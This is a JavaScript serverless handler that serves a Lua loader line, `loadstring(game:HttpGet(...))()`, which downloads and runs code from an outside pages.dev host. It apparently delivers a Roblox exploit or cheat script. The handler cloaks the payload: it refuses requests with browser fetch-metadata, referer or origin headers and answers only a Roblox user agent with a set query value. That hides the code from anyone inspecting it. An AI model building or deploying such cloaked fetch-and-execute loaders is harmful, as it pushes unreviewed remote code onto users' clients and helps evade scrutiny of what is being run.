export default function handler(req, res) {
    try {
        const hosted = req.query.hosted;
        const accept = req.headers['accept'] || '';
        const userAgent = req.headers['user-agent'] || '';
        const secFetchSite = req.headers['sec-fetch-site'] || '';
        const secFetchMode = req.headers['sec-fetch-mode'] || '';
        const secFetchDest = req.headers['sec-fetch-dest'] || '';
        const referer = req.headers['referer'] || '';
        const origin = req.headers['origin'] || '';
        
        if (hosted !== "xyz.loader") {
            res.status(403).send("Invalid hosted parameter");
            return;
        }
        
        if (secFetchSite || secFetchMode || secFetchDest || referer || origin) {
            res.status(403).send("Access denied");
            return;
        }
        
        if (accept.includes("text/html") || accept.includes("application/json") || accept === "*/*") {
            if (!userAgent.includes("Roblox")) {
                res.status(403).send("Access denied");
                return;
            }
        }

        const luaScriptContent = `loadstring(game:HttpGet("https://aiikomare.pages.dev/mainloader"))()`;

        res.setHeader("Content-Type", "text/plain");
        res.status(200).send(luaScriptContent);

    } catch (error) {
        res.status(500).send("Internal Server Error");
    }
}
